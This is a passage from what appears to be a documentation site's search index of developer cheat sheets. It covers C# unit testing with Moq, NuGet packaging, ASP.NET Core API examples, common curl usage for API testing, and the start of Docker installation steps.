public void Addition_DifferentValues(int a, int b, int expected)\n    {\n        var result = _calculator.Add(a, b);\n        Assert.That(result, Is.EqualTo(expected));\n    }\n\n    [TearDown]\n    public void Cleanup()\n    {\n        _calculator = null;\n    }\n}\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#moq-mocking-framework","title":"Moq - Mocking Framework","text":"<pre><code>dotnet add package Moq\n</code></pre> <pre><code>using Moq;\nusing Xunit;\n\npublic interface IUserRepository\n{\n    Task&lt;User&gt; GetAsync(int id);\n    Task&lt;bool&gt; SaveAsync(User user);\n}\n\npublic class UserServiceTests\n{\n    [Fact]\n    public async Task GetUser_WithValidId_CallsRepository()\n    {\n        // Arrange\n        var mockRepo = new Mock&lt;IUserRepository&gt;();\n        mockRepo\n            .Setup(r =&gt; r.GetAsync(1))\n            .ReturnsAsync(new User { Id = 1, Name = \"John\" });\n\n        var service = new UserService(mockRepo.Object);\n\n        // Act\n        var user = await service.GetUserAsync(1);\n\n        // Assert\n        Assert.NotNull(user);\n        Assert.Equal(\"John\", user.Name);\n        mockRepo.Verify(r =&gt; r.GetAsync(1), Times.Once);\n    }\n\n    [Fact]\n    public async Task SaveUser_WithEmptyName_ThrowsException()\n    {\n        // Arrange\n        var mockRepo = new Mock&lt;IUserRepository&gt;();\n        var service = new UserService(mockRepo.Object);\n\n        // Act &amp; Assert\n        await Assert.ThrowsAsync&lt;ArgumentException&gt;(\n            () =&gt; service.SaveAsync(new User { Name = \"\" })\n        );\n\n        // Verify repository was not called\n        mockRepo.Verify(r =&gt; r.SaveAsync(It.IsAny&lt;User&gt;()), Times.Never);\n    }\n}\n</code></pre> <p>Advanced Moq Setup:</p> <pre><code>// Return different values\nmock.SetupSequence(m =&gt; m.GetValue())\n    .Returns(1)\n    .Returns(2)\n    .Returns(3);\n\n// Callback\nmock.Setup(m =&gt; m.Save(It.IsAny&lt;User&gt;()))\n    .Callback&lt;User&gt;(u =&gt; Console.WriteLine($\"Saving {u.Name}\"))\n    .Returns(true);\n\n// With conditions\nmock.Setup(m =&gt; m.GetById(It.Is&lt;int&gt;(id =&gt; id &gt; 0)))\n    .Returns(new User());\n\n// Properties\nmock.SetupGet(m =&gt; m.Count).Returns(5);\nmock.SetupSet(m =&gt; m.Name = \"test\");\n\n// Exceptions\nmock.Setup(m =&gt; m.Delete(It.IsAny&lt;int&gt;()))\n    .Throws&lt;InvalidOperationException&gt;();\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#running-tests","title":"Running Tests","text":"<pre><code># Run all tests\ndotnet test\n\n# With verbosity\ndotnet test --verbosity normal\n\n# Tests from a specific project\ndotnet test MyTests/MyTests.csproj\n\n# Filter by name\ndotnet test --filter \"FullyQualifiedName~CalculatorTests\"\ndotnet test --filter \"Name~Addition\"\n\n# Filter by category\ndotnet test --filter \"Category=Integration\"\n\n# With code coverage\ndotnet test --collect:\"XPlat Code Coverage\"\n\n# Watch mode\ndotnet watch test\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#code-coverage-with-coverlet","title":"Code Coverage with Coverlet","text":"<pre><code># Install coverlet\ndotnet add package coverlet.collector\n\n# Generate coverage\ndotnet test --collect:\"XPlat Code Coverage\"\n\n# With ReportGenerator for HTML\ndotnet tool install -g dotnet-reportgenerator-globaltool\n\nreportgenerator \\\n  -reports:\"**/coverage.cobertura.xml\" \\\n  -targetdir:\"coveragereport\" \\\n  -reporttypes:Html\n\n# View the report\nopen coveragereport/index.html\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#nuget-package-management_1","title":"NuGet - Package Management","text":""},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#creating-a-nuget-package","title":"Creating a NuGet Package","text":"<p>1. Configure the .csproj:</p> <pre><code>&lt;Project Sdk=\"Microsoft.NET.Sdk\"&gt;\n\n  &lt;PropertyGroup&gt;\n    &lt;TargetFramework&gt;net8.0&lt;/TargetFramework&gt;\n\n    &lt;!-- Package metadata --&gt;\n    &lt;PackageId&gt;MyPackage.Utils&lt;/PackageId&gt;\n    &lt;Version&gt;1.0.0&lt;/Version&gt;\n    &lt;Authors&gt;Your Name&lt;/Authors&gt;\n    &lt;Company&gt;Your Company&lt;/Company&gt;\n    &lt;Description&gt;Utilities to simplify development&lt;/Description&gt;\n    &lt;PackageLicenseExpression&gt;MIT&lt;/PackageLicenseExpression&gt;\n    &lt;PackageProjectUrl&gt;https://github.com/user/repo&lt;/PackageProjectUrl&gt;\n    &lt;RepositoryUrl&gt;https://github.com/user/repo&lt;/RepositoryUrl&gt;\n    &lt;RepositoryType&gt;git&lt;/RepositoryType&gt;\n    &lt;PackageTags&gt;utils;helpers;extensions&lt;/PackageTags&gt;\n    &lt;PackageReleaseNotes&gt;Initial version&lt;/PackageReleaseNotes&gt;\n    &lt;PackageReadmeFile&gt;README.md&lt;/PackageReadmeFile&gt;\n    &lt;PackageIcon&gt;icon.png&lt;/PackageIcon&gt;\n\n    &lt;!-- Package generation --&gt;\n    &lt;GeneratePackageOnBuild&gt;true&lt;/GeneratePackageOnBuild&gt;\n    &lt;IncludeSymbols&gt;true&lt;/IncludeSymbols&gt;\n    &lt;SymbolPackageFormat&gt;snupkg&lt;/SymbolPackageFormat&gt;\n  &lt;/PropertyGroup&gt;\n\n  &lt;ItemGroup&gt;\n    &lt;None Include=\"README.md\" Pack=\"true\" PackagePath=\"\\\" /&gt;\n    &lt;None Include=\"icon.png\" Pack=\"true\" PackagePath=\"\\\" /&gt;\n  &lt;/ItemGroup&gt;\n\n&lt;/Project&gt;\n</code></pre> <p>2. Create the package:</p> <pre><code># Pack the project\ndotnet pack -c Release\n\n# Specify version\ndotnet pack -c Release -p:PackageVersion=1.2.3\n\n# Custom output\ndotnet pack -c Release -o ./nupkgs\n</code></pre> <p>3. Publish to NuGet.org:</p> <pre><code># Get an API key from nuget.org\n# Publish the package\ndotnet nuget push MyPackage.1.0.0.nupkg --api-key YOUR_API_KEY --source https://api.nuget.org/v3/index.json\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#custom-nuget-sources","title":"Custom NuGet Sources","text":"<p>Configuration in <code>nuget.config</code>:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;configuration&gt;\n  &lt;packageSources&gt;\n    &lt;clear /&gt;\n    &lt;add key=\"nuget.org\" value=\"https://api.nuget.org/v3/index.json\" /&gt;\n    &lt;add key=\"MyPrivateFeed\" value=\"https://pkgs.dev.azure.com/myorg/_packaging/myfeed/nuget/v3/index.json\" /&gt;\n    &lt;add key=\"LocalFeed\" value=\"./local-packages\" /&gt;\n  &lt;/packageSources&gt;\n\n  &lt;packageSourceCredentials&gt;\n    &lt;MyPrivateFeed&gt;\n      &lt;add key=\"Username\" value=\"myusername\" /&gt;\n      &lt;add key=\"ClearTextPassword\" value=\"mypassword\" /&gt;\n    &lt;/MyPrivateFeed&gt;\n  &lt;/packageSourceCredentials&gt;\n&lt;/configuration&gt;\n</code></pre> <p>Commands:</p> <pre><code># List sources\ndotnet nuget list source\n\n# Add a source\ndotnet nuget add source https://api.myget.org/F/myfeed/api/v3/index.json -n MyGetFeed\n\n# Remove a source\ndotnet nuget remove source MyGetFeed\n\n# Enable/disable a source\ndotnet nuget enable source MyGetFeed\ndotnet nuget disable source MyGetFeed\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#local-feed","title":"Local Feed","text":"<pre><code># Create a folder for packages\nmkdir local-packages\n\n# Copy packages\ndotnet pack -o ./local-packages\n\n# Add as source\ndotnet nuget add source ./local-packages -n LocalFeed\n\n# Use\ndotnet add package MyPackage --source LocalFeed\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#project-structure-examples","title":"Project Structure Examples","text":""},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#minimal-web-api-net-8","title":"Minimal Web API (.NET 8)","text":"<p>Program.cs:</p> <pre><code>using Microsoft.EntityFrameworkCore;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Configuration\nbuilder.Services.AddEndpointsApiExplorer();\nbuilder.Services.AddSwaggerGen();\nbuilder.Services.AddDbContext&lt;AppDbContext&gt;(options =&gt;\n    options.UseSqlServer(builder.Configuration.GetConnectionString(\"DefaultConnection\"))\n);\n\n// CORS\nbuilder.Services.AddCors(options =&gt;\n{\n    options.AddPolicy(\"AllowAll\", policy =&gt;\n    {\n        policy.AllowAnyOrigin()\n              .AllowAnyMethod()\n              .AllowAnyHeader();\n    });\n});\n\nvar app = builder.Build();\n\n// Middleware\nif (app.Environment.IsDevelopment())\n{\n    app.UseSwagger();\n    app.UseSwaggerUI();\n}\n\napp.UseHttpsRedirection();\napp.UseCors(\"AllowAll\");\n\n// Endpoints\napp.MapGet(\"/api/users\", async (AppDbContext db) =&gt;\n{\n    return await db.Users.ToListAsync();\n});\n\napp.MapGet(\"/api/users/{id}\", async (int id, AppDbContext db) =&gt;\n{\n    var user = await db.Users.FindAsync(id);\n    return user is not null ? Results.Ok(user) : Results.NotFound();\n});\n\napp.MapPost(\"/api/users\", async (User user, AppDbContext db) =&gt;\n{\n    db.Users.Add(user);\n    await db.SaveChangesAsync();\n    return Results.Created($\"/api/users/{user.Id}\", user);\n});\n\napp.MapPut(\"/api/users/{id}\", async (int id, User user, AppDbContext db) =&gt;\n{\n    var existingUser = await db.Users.FindAsync(id);\n    if (existingUser is null) return Results.NotFound();\n\n    existingUser.Name = user.Name;\n    existingUser.Email = user.Email;\n    await db.SaveChangesAsync();\n\n    return Results.NoContent();\n});\n\napp.MapDelete(\"/api/users/{id}\", async (int id, AppDbContext db) =&gt;\n{\n    var user = await db.Users.FindAsync(id);\n    if (user is null) return Results.NotFound();\n\n    db.Users.Remove(user);\n    await db.SaveChangesAsync();\n\n    return Results.NoContent();\n});\n\napp.Run();\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#web-api-with-controllers","title":"Web API with Controllers","text":"<p>Program.cs:</p> <pre><code>var builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddControllers();\nbuilder.Services.AddEndpointsApiExplorer();\nbuilder.Services.AddSwaggerGen();\n\n// Dependency injection\nbuilder.Services.AddScoped&lt;IUserService, UserService&gt;();\nbuilder.Services.AddScoped&lt;IUserRepository, UserRepository&gt;();\n\nvar app = builder.Build();\n\nif (app.Environment.IsDevelopment())\n{\n    app.UseSwagger();\n    app.UseSwaggerUI();\n}\n\napp.UseHttpsRedirection();\napp.UseAuthorization();\napp.MapControllers();\n\napp.Run();\n</code></pre> <p>Controller:</p> <pre><code>using Microsoft.AspNetCore.Mvc;\n\n[ApiController]\n[Route(\"api/[controller]\")]\npublic class UsersController : ControllerBase\n{\n    private readonly IUserService _userService;\n    private readonly ILogger&lt;UsersController&gt; _logger;\n\n    public UsersController(IUserService userService, ILogger&lt;UsersController&gt; logger)\n    {\n        _userService = userService;\n        _logger = logger;\n    }\n\n    [HttpGet]\n    public async Task&lt;ActionResult&lt;IEnumerable&lt;UserDto&gt;&gt;&gt; GetAll()\n    {\n        var users = await _userService.GetAllUsersAsync();\n        return Ok(users);\n    }\n\n    [HttpGet(\"{id}\")]\n    [ProducesResponseType(StatusCodes.Status200OK)]\n    [ProducesResponseType(StatusCodes.Status404NotFound)]\n    public async Task&lt;ActionResult&lt;UserDto&gt;&gt; GetById(int id)\n    {\n        var user = await _userService.GetUserByIdAsync(id);\n        if (user == null)\n        {\n            _logger.LogWarning(\"User {UserId} not found\", id);\n            return NotFound();\n        }\n\n        return Ok(user);\n    }\n\n    [HttpPost]\n    [ProducesResponseType(StatusCodes.Status201Created)]\n    [ProducesResponseType(StatusCodes.Status400BadRequest)]\n    public async Task&lt;ActionResult&lt;UserDto&gt;&gt; Create([FromBody] CreateUserDto dto)\n    {\n        if (!ModelState.IsValid)\n            return BadRequest(ModelState);\n\n        var user = await _userService.CreateUserAsync(dto);\n        return CreatedAtAction(nameof(GetById), new { id = user.Id }, user);\n    }\n\n    [HttpPut(\"{id}\")]\n    [ProducesResponseType(StatusCodes.Status204NoContent)]\n    [ProducesResponseType(StatusCodes.Status404NotFound)]\n    public async Task&lt;IActionResult&gt; Update(int id, [FromBody] UpdateUserDto dto)\n    {\n        var success = await _userService.UpdateUserAsync(id, dto);\n        if (!success)\n            return NotFound();\n\n        return NoContent();\n    }\n\n    [HttpDelete(\"{id}\")]\n    public async Task&lt;IActionResult&gt; Delete(int id)\n    {\n        await _userService.DeleteUserAsync(id);\n        return NoContent();\n    }\n}\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#useful-tools","title":"Useful Tools","text":""},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#dotnet-cli-extensions","title":"dotnet CLI Extensions","text":"<pre><code># Install global tools\ndotnet tool install -g dotnet-ef                    # Entity Framework\ndotnet tool install -g dotnet-outdated-tool         # Check outdated packages\ndotnet tool install -g dotnet-format                # Code formatting\ndotnet tool install -g dotnet-aspnet-codegenerator  # Scaffolding\n\n# List installed tools\ndotnet tool list -g\n\n# Update a tool\ndotnet tool update -g dotnet-ef\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#entity-framework-core","title":"Entity Framework Core","text":"<pre><code># Migrations\ndotnet ef migrations add InitialCreate\ndotnet ef migrations remove\ndotnet ef migrations list\n\n# Database\ndotnet ef database update\ndotnet ef database drop\n\n# Scaffolding (database-first)\ndotnet ef dbcontext scaffold \"Connection String\" Microsoft.EntityFrameworkCore.SqlServer -o Models\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#formatting-and-analysis","title":"Formatting and Analysis","text":"<pre><code># Format code\ndotnet format\n\n# Analyze code\ndotnet build --no-incremental /p:TreatWarningsAsErrors=true\n\n# Code style analysis\ndotnet build /p:EnforceCodeStyleInBuild=true\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#recommendations","title":"\u2705 Recommendations","text":"<ol> <li>Use .NET 8 or newer (LTS)</li> <li>Enable nullable reference types (<code>&lt;Nullable&gt;enable&lt;/Nullable&gt;</code>)</li> <li>Use appsettings.json for configuration</li> <li>User Secrets for sensitive data in development</li> <li>Dependency Injection for decoupling</li> <li>Structured logging (Serilog, NLog)</li> <li>Unit tests with coverage &gt; 80%</li> <li>Semantic versioning for NuGet packages</li> <li>CI/CD with GitHub Actions, Azure DevOps, etc.</li> <li>XML documentation for public APIs</li> </ol>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#to-avoid","title":"\u274c To Avoid","text":"<ol> <li>\u274c Storing secrets in appsettings.json</li> <li>\u274c Using <code>#pragma warning disable</code></li> <li>\u274c Circular references between projects</li> <li>\u274c Business logic in controllers</li> <li>\u274c Generic catch without logging: <code>catch (Exception) { }</code></li> </ol>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#resources","title":"Resources","text":"<ul> <li>.NET Documentation</li> <li>C# Guide</li> <li>ASP.NET Core</li> <li>Entity Framework Core</li> <li>NuGet Gallery</li> <li>.NET CLI Reference</li> </ul>"},{"location":"cheat-sheet/curl/curl/","title":"curl - Cheat Sheet","text":""},{"location":"cheat-sheet/curl/curl/#overview","title":"Overview","text":"<p>curl (Client URL) is a command-line tool for transferring data using various protocols (HTTP, HTTPS, FTP, etc.). It's one of the most versatile tools for testing APIs and downloading files.</p>"},{"location":"cheat-sheet/curl/curl/#basic-usage","title":"Basic Usage","text":""},{"location":"cheat-sheet/curl/curl/#simple-get-request","title":"Simple GET Request","text":"<pre><code># Basic GET request\ncurl https://api.example.com\n\n# GET with output to file\ncurl https://example.com -o page.html\ncurl https://example.com --output page.html\n\n# Download with original filename\ncurl -O https://example.com/file.zip\n\n# Follow redirects\ncurl -L https://example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#verbose-and-silent-modes","title":"Verbose and Silent Modes","text":"<pre><code># Verbose mode (show detailed info)\ncurl -v https://api.example.com\n\n# Silent mode (no progress bar)\ncurl -s https://api.example.com\n\n# Show only HTTP headers\ncurl -I https://api.example.com\ncurl --head https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#http-methods","title":"HTTP Methods","text":""},{"location":"cheat-sheet/curl/curl/#get-request","title":"GET Request","text":"<pre><code># Simple GET\ncurl https://api.example.com/users\n\n# GET with query parameters\ncurl \"https://api.example.com/users?page=1&amp;limit=10\"\n\n# GET with headers\ncurl -H \"Authorization: Bearer TOKEN\" https://api.example.com/users\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#post-request","title":"POST Request","text":"<pre><code># POST with JSON data\ncurl -X POST https://api.example.com/users \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"John\",\"email\":\"john@example.com\"}'\n\n# POST with data from file\ncurl -X POST https://api.example.com/users \\\n  -H \"Content-Type: application/json\" \\\n  -d @data.json\n\n# POST form data\ncurl -X POST https://api.example.com/login \\\n  -d \"username=john\" \\\n  -d \"password=secret\"\n\n# POST multipart form (file upload)\ncurl -X POST https://api.example.com/upload \\\n  -F \"file=@document.pdf\" \\\n  -F \"description=My document\"\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#put-request","title":"PUT Request","text":"<pre><code># PUT to update a resource\ncurl -X PUT https://api.example.com/users/123 \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"John Doe\",\"email\":\"john@example.com\"}'\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#patch-request","title":"PATCH Request","text":"<pre><code># PATCH to partially update\ncurl -X PATCH https://api.example.com/users/123 \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"newemail@example.com\"}'\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#delete-request","title":"DELETE Request","text":"<pre><code># DELETE a resource\ncurl -X DELETE https://api.example.com/users/123\n\n# DELETE with authentication\ncurl -X DELETE https://api.example.com/users/123 \\\n  -H \"Authorization: Bearer TOKEN\"\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#headers","title":"Headers","text":""},{"location":"cheat-sheet/curl/curl/#setting-headers","title":"Setting Headers","text":"<pre><code># Single header\ncurl -H \"Authorization: Bearer TOKEN\" https://api.example.com\n\n# Multiple headers\ncurl -H \"Authorization: Bearer TOKEN\" \\\n     -H \"Content-Type: application/json\" \\\n     -H \"Accept: application/json\" \\\n     https://api.example.com\n\n# User-Agent\ncurl -A \"MyApp/1.0\" https://api.example.com\ncurl --user-agent \"MyApp/1.0\" https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#viewing-response-headers","title":"Viewing Response Headers","text":"<pre><code># Headers only\ncurl -I https://api.example.com\n\n# Headers + body\ncurl -i https://api.example.com\n\n# Verbose (request + response headers)\ncurl -v https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#authentication","title":"Authentication","text":""},{"location":"cheat-sheet/curl/curl/#basic-authentication","title":"Basic Authentication","text":"<pre><code># Basic auth\ncurl -u username:password https://api.example.com\n\n# Basic auth (interactive password prompt)\ncurl -u username https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#bearer-token","title":"Bearer Token","text":"<pre><code># Bearer token\ncurl -H \"Authorization: Bearer YOUR_TOKEN\" https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#api-key","title":"API Key","text":"<pre><code># API key in header\ncurl -H \"X-API-Key: YOUR_API_KEY\" https://api.example.com\n\n# API key in query parameter\ncurl \"https://api.example.com/data?api_key=YOUR_API_KEY\"\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#data-formats","title":"Data Formats","text":""},{"location":"cheat-sheet/curl/curl/#json","title":"JSON","text":"<pre><code># Send JSON data\ncurl -X POST https://api.example.com/users \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"John\",\"age\":30}'\n\n# JSON from file\ncurl -X POST https://api.example.com/users \\\n  -H \"Content-Type: application/json\" \\\n  -d @user.json\n\n# Pretty print JSON response (with jq)\ncurl https://api.example.com/users | jq\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#form-data","title":"Form Data","text":"<pre><code># URL-encoded form data\ncurl -X POST https://api.example.com/login \\\n  -d \"username=john\" \\\n  -d \"password=secret\"\n\n# Equivalent with --data-urlencode\ncurl -X POST https://api.example.com/search \\\n  --data-urlencode \"query=hello world\" \\\n  --data-urlencode \"page=1\"\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#file-upload","title":"File Upload","text":"<pre><code># Upload a file\ncurl -X POST https://api.example.com/upload \\\n  -F \"file=@document.pdf\"\n\n# Upload with additional fields\ncurl -X POST https://api.example.com/upload \\\n  -F \"file=@image.jpg\" \\\n  -F \"title=My Image\" \\\n  -F \"description=A beautiful sunset\"\n\n# Multiple files\ncurl -X POST https://api.example.com/upload \\\n  -F \"file1=@doc1.pdf\" \\\n  -F \"file2=@doc2.pdf\"\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#response-handling","title":"Response Handling","text":""},{"location":"cheat-sheet/curl/curl/#save-response","title":"Save Response","text":"<pre><code># Save to file\ncurl https://api.example.com/data -o data.json\n\n# Use remote filename\ncurl -O https://example.com/file.zip\n\n# Save headers to file\ncurl -D headers.txt https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#filter-response","title":"Filter Response","text":"<pre><code># Get only HTTP status code\ncurl -s -o /dev/null -w \"%{http_code}\" https://api.example.com\n\n# Get response time\ncurl -s -o /dev/null -w \"%{time_total}\" https://api.example.com\n\n# Multiple format variables\ncurl -s -o /dev/null -w \"Status: %{http_code}\\nTime: %{time_total}s\\n\" \\\n  https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#cookies","title":"Cookies","text":""},{"location":"cheat-sheet/curl/curl/#send-cookies","title":"Send Cookies","text":"<pre><code># Send cookie\ncurl -b \"session=abc123\" https://api.example.com\n\n# Send from cookie file\ncurl -b cookies.txt https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#save-cookies","title":"Save Cookies","text":"<pre><code># Save cookies to file\ncurl -c cookies.txt https://api.example.com\n\n# Use and update cookies\ncurl -b cookies.txt -c cookies.txt https://api.example.com/login \\\n  -d \"username=john&amp;password=secret\"\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#advanced-options","title":"Advanced Options","text":""},{"location":"cheat-sheet/curl/curl/#timeout","title":"Timeout","text":"<pre><code># Connection timeout (seconds)\ncurl --connect-timeout 10 https://api.example.com\n\n# Max time for entire operation\ncurl --max-time 30 https://api.example.com\n\n# Both\ncurl --connect-timeout 10 --max-time 30 https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#retry","title":"Retry","text":"<pre><code># Retry on failure\ncurl --retry 3 https://api.example.com\n\n# Retry with delay\ncurl --retry 3 --retry-delay 2 https://api.example.com\n\n# Retry on specific HTTP codes\ncurl --retry 3 --retry-connrefused https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#proxy","title":"Proxy","text":"<pre><code># Use HTTP proxy\ncurl -x http://proxy.example.com:8080 https://api.example.com\n\n# Proxy with authentication\ncurl -x http://user:pass@proxy.example.com:8080 https://api.example.com\n\n# SOCKS5 proxy\ncurl --socks5 localhost:1080 https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#ssltls","title":"SSL/TLS","text":"<pre><code># Ignore SSL certificate verification (insecure!)\ncurl -k https://self-signed.example.com\ncurl --insecure https://self-signed.example.com\n\n# Specify CA certificate\ncurl --cacert ca-bundle.crt https://api.example.com\n\n# Use client certificate\ncurl --cert client.pem --key client-key.pem https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#common-use-cases","title":"Common Use Cases","text":""},{"location":"cheat-sheet/curl/curl/#test-api-endpoint","title":"Test API Endpoint","text":"<pre><code># Check if API is up\ncurl -I https://api.example.com/health\n\n# Test with authentication\ncurl -H \"Authorization: Bearer TOKEN\" \\\n     -H \"Accept: application/json\" \\\n     https://api.example.com/users | jq\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#download-file","title":"Download File","text":"<pre><code># Download with progress bar\ncurl -O https://example.com/file.zip\n\n# Resume interrupted download\ncurl -C - -O https://example.com/largefile.zip\n\n# Download multiple files\ncurl -O https://example.com/file1.zip -O https://example.com/file2.zip\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#debug-api-call","title":"Debug API Call","text":"<pre><code># Full verbose output\ncurl -v https://api.example.com/users\n\n# Show only request headers\ncurl -v https://api.example.com/users 2&gt;&amp;1 | grep \"^&gt;\"\n\n# Show only response headers\ncurl -v https://api.example.com/users 2&gt;&amp;1 | grep \"^&lt;\"\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#performance-testing","title":"Performance Testing","text":"<pre><code># Measure request time\ncurl -w \"@curl-format.txt\" -o /dev/null -s https://api.example.com\n\n# Create curl-format.txt:\ncat &gt; curl-format.txt &lt;&lt; 'EOF'\n    time_namelookup:  %{time_namelookup}s\\n\n       time_connect:  %{time_connect}s\\n\n    time_appconnect:  %{time_appconnect}s\\n\n   time_pretransfer:  %{time_pretransfer}s\\n\n      time_redirect:  %{time_redirect}s\\n\n time_starttransfer:  %{time_starttransfer}s\\n\n                    ----------\\n\n         time_total:  %{time_total}s\\n\nEOF\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#graphql-query","title":"GraphQL Query","text":"<pre><code># GraphQL request\ncurl -X POST https://api.example.com/graphql \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"query\": \"{ users { id name email } }\"\n  }'\n\n# With variables\ncurl -X POST https://api.example.com/graphql \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"query\": \"query GetUser($id: ID!) { user(id: $id) { name email } }\",\n    \"variables\": {\"id\": \"123\"}\n  }'\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#useful-format-variables","title":"Useful Format Variables","text":"<pre><code># Common format variables for -w option:\n%{http_code}           # HTTP status code\n%{time_total}          # Total time in seconds\n%{time_namelookup}     # DNS lookup time\n%{time_connect}        # TCP connect time\n%{time_starttransfer}  # Time to first byte\n%{size_download}       # Downloaded bytes\n%{speed_download}      # Download speed (bytes/sec)\n%{url_effective}       # Final URL after redirects\n\n# Example usage:\ncurl -w \"Status: %{http_code}\\nTime: %{time_total}s\\n\" \\\n  -o /dev/null -s https://api.example.com\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#tips-tricks","title":"Tips &amp; Tricks","text":""},{"location":"cheat-sheet/curl/curl/#create-alias","title":"Create Alias","text":"<pre><code># Add to ~/.bashrc or ~/.zshrc\nalias curljson='curl -H \"Content-Type: application/json\"'\nalias curlpost='curl -X POST -H \"Content-Type: application/json\"'\n\n# Usage\ncurljson https://api.example.com/users\ncurlpost https://api.example.com/users -d '{\"name\":\"John\"}'\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#config-file","title":"Config File","text":"<pre><code># Create ~/.curlrc with default options\n# Example ~/.curlrc:\nuser-agent = \"MyApp/1.0\"\nconnect-timeout = 10\nmax-time = 30\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#parallel-requests","title":"Parallel Requests","text":"<pre><code># Multiple requests in parallel (with GNU parallel)\ncat urls.txt | parallel -j 10 curl -O\n\n# Or with xargs\ncat urls.txt | xargs -P 10 -n 1 curl -O\n</code></pre>"},{"location":"cheat-sheet/curl/curl/#common-options-summary","title":"Common Options Summary","text":"Option Description <code>-X, --request</code> HTTP method (GET, POST, PUT, DELETE, etc.) <code>-d, --data</code> Send data in POST request <code>-H, --header</code> Add custom header <code>-o, --output</code> Write output to file <code>-O, --remote-name</code> Save with remote filename <code>-i, --include</code> Include response headers in output <code>-I, --head</code> Show headers only <code>-v, --verbose</code> Verbose mode <code>-s, --silent</code> Silent mode <code>-L, --location</code> Follow redirects <code>-u, --user</code> User authentication <code>-b, --cookie</code> Send cookies <code>-c, --cookie-jar</code> Save cookies <code>-A, --user-agent</code> Set user agent <code>-F, --form</code> Multipart form data <code>-w, --write-out</code> Format output <code>-k, --insecure</code> Skip SSL verification"},{"location":"cheat-sheet/curl/curl/#resources","title":"Resources","text":"<ul> <li>curl Documentation</li> <li>curl Manual</li> <li>Everything curl Book</li> </ul>"},{"location":"cheat-sheet/docker/docker/","title":"Docker - Complete Cheat Sheet","text":"<p>Docker is a containerization platform that allows you to package, distribute, and run applications in isolated environments called containers.</p>"},{"location":"cheat-sheet/docker/docker/#installation","title":"Installation","text":""},{"location":"cheat-sheet/docker/docker/#linux-ubuntudebian","title":"Linux (Ubuntu/Debian)","text":"<pre><code># Uninstall old versions\nsudo apt-get remove docker docker-engine docker.io containerd runc\n\n# Install dependencies\nsudo apt-get update\nsudo apt-get install ca-certificates curl gnupg lsb-release\n\n# Add Docker's official GPG key\nsudo mkdir -p /etc/apt/keyrings\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\n\n# Set up the repository\necho \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\n\n# Install Docker Engine\nsudo apt-get update\nsudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#macos","title":"macOS","text":"<pre><code># Via Homebrew\nbrew install --cask docker\n\n# Or download Docker Desktop\n# 